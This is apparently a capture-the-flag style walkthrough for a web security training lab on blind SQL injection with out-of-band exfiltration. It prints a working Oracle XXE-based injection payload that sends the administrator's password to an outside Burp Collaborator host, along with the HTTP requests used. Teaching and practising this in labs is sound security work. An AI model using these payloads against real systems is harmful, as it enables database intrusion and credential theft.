# Blind SQL injection with out-of-band data exfiltration - The easy solution

send request for the home page to repeater
the injectable location is between the end of the tracking cookie and the semi colin
```
Cookie: TrackingId=yo3lljVcGknlZs43 (here) ;
```
Send to intruder and select/highlight that spot
```
Cookie: TrackingId=yo3lljVcGknlZs43§ §; session=b5JQ5IUnadQ77eMtVMlUICyB1apxT8Vu
```
Then right click, scan defined insertion point, and it will discover OOB interaction
Here is the alert:
SQL Injection
```
Issue detail
The manual insertion point 1 appears to be vulnerable to SQL injection attacks.
The payload '||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % absfl SYSTEM "http://udbeg41va7rqz00fq8azwtnyspyjm9ady4oref3.oasti'||'fy.com/">%absfl;]>'),'/l') from dual)||'
was submitted in the manual insertion point 1.
This payload injects a SQL sub-query that calls Oracle's xmltype function to evaluate some data as XML.
The supplied XML defines an external entity that references a URL on an external domain.
The application interacted with that domain, indicating that the injected SQL query was executed.
The database appears to be Oracle. 
```
**Request**
```
GET / HTTP/2
Host: 0ae7000603e8320a82d33450009f004a.web-security-academy.net
Cookie: TrackingId=yo3lljVcGknlZs43'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20absfl%20SYSTEM%20%22http%3a%2f%2fudbeg41va7rqz00fq8azwtnyspyjm9ady4oref3.oasti'%7c%7c'fy.com%2f%22%3e%25absfl%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'; session=b5JQ5IUnadQ77eMtVMlUICyB1apxT8Vu
```
* Decoded the scanner payload is
* `yo3lljVcGknlZs43'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % absfl SYSTEM "http://udbeg41va7rqz00fq8azwtnyspyjm9ady4oref3.oasti'||'fy.com/">«sfl;]>'),'/l`

**Collaborator HTTP interaction**
```
GET / HTTP/1.0
Host: udbeg41va7rqz00fq8azwtnyspyjm9ady4oref3.oastify.com
Content-Type: text/plain; charset=utf-8
```
_the Host is the signifigant part_

* At this point all ya gotta do is modify the scanner payload to your specs:
**Copy the scanner payload from the inspector editor, and edit it in a text document, or in the editor**
1. You need the administrator's password, Use Oracle's SQL query to get it
  `(SELECT password from users where username='administrator')`
2. Cause the app to connect to your burp collaborator server, so include that URL in the query
3. Change the **ENTITY** value from the scanner's `% absfl` to `% remote`
4. The **SYSTEM** must call from the command in step 1, and include the `||` 
   ```
   SYSTEM "http://'||(SELECT password from users where username='administrator')
   ```
6. Followed by `||'.yourburpcollaboratordomain.oastify.com/"
7. Reference the **ENTITY** `remote`
  And here it is complete SQL Injection to get the admin's password:
```
' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.burpcollab.oastify.com/"> %remote;]>'),'/l') FROM dual)--
```
replace burpcollab in the example above with yours

**Now put it in the Inspector editor and save changes and send the request**
Check your collab server and you will see in an HTTP request to it:
```
GET / HTTP/1.0
Host: 3pdm0kmm3be2otrzu11u.4v0eryjx53xeu6ybit3shuudw42vqoed.oastify.com
Content-Type: text/plain; charset=utf-8
```
**the Host sub domain is the admin's password.**
In this example it's **3pdm0kmm3be2otrzu11u**

Now go to the login page and login with the credentials

username
`administrator`

password
`3pdm0kmm3be2otrzu11u`

**See the ORACLE SQL Language Reference to make sense of the SQLi**

[Concatenation Operator || ](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/Concatenation-Operator.html#GUID-08C10738-706B-4290-B7CD-C279EBC90F7E)

